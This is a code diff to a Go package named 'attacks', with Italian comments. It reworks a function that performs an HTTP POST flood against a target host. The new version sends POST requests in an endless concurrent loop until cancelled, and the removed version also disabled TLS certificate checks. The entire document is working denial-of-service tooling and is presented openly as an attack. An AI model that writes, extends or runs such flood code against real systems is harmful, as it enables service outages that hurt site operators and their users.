@@ -1,47 +1,46 @@
 package attacks
 
 import (
-	"crypto/tls"
-	"fmt"
+	"context"
+	"log"
 	"net/http"
 	"strings"
+	"sync"
 	"time"
 )
 
-// SendHTTPPost esegue un attacco HTTP POST flood contro un host
-func SendHTTPPost(target, body, userAgent string) error {
-	// Aggiungiamo il prefisso "http://" se manca
-	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
-		target = "http://" + target
-	}
+// SendHTTPPost invia richieste HTTP POST in modo continuativo
+func SendHTTPPost(target, body, userAgent string, wg *sync.WaitGroup, ctx context.Context) {
+	defer wg.Done()
 
-	// Configura un client HTTP che ignora la validazione del certificato SSL/TLS
-	tr := &http.Transport{
-		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-	}
 	client := &http.Client{
-		Transport: tr,
-		Timeout:   10 * time.Second,
+		Timeout: 5 * time.Second,
 	}
 
-	req, err := http.NewRequest("POST", target, strings.NewReader(body))
-	if err != nil {
-		return fmt.Errorf("failed to create HTTP POST request: %v", err)
+	for {
+		select {
+		case <-ctx.Done():
+			log.Println("HTTP POST flood interrotto.")
+			return
+		default:
+			req, err := http.NewRequest("POST", target, strings.NewReader(body))
+			if err != nil {
+				log.Printf("Error creating HTTP POST request: %v", err)
+				continue
+			}
+			if userAgent != "" {
+				req.Header.Set("User-Agent", userAgent)
+			}
+			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+			resp, err := client.Do(req)
+			if err != nil {
+				log.Printf("Error in HTTP POST request: %v", err)
+				continue
+			}
+			resp.Body.Close()
+
+			log.Printf("POST request sent to %s, Status: %s\n", target, resp.Status)
+		}
 	}
-
-	// Imposta l'User-Agent se specificato
-	if userAgent != "" {
-		req.Header.Set("User-Agent", userAgent)
-	}
-
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-
-	resp, err := client.Do(req)
-	if err != nil {
-		return fmt.Errorf("HTTP POST request failed: %v", err)
-	}
-	defer resp.Body.Close()
-
-	// Restituisce nil se tutto è andato a buon fine
-	return nil
 }
